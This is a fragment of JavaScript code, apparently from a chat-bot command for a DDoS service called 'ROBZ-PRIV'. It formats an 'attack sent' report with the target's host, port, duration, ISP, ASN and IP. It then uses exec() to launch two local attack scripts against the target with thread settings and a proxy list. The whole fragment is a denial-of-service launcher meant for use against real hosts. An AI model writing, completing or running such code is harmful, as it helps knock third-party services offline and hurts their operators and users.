...
╭━✧「 <b>ROBZ-PRIV Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
┃⏱️ <b>Duration:</b> ${duration}s
┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
┃⚡ <b>Method:</b> ROBZ-PRIV 
┃🏢 <b>ISP:</b> ${info.isp}
┃🏷️ <b>ASN:</b> ${info.as}
┃🌍 <b>IP:</b> ${info.query}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const robzpriv = path.join(__dirname, `../lib/cache/robz-priv`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${robzpriv} ${target} ${duration} 64 16 proxy.txt`);
  },
};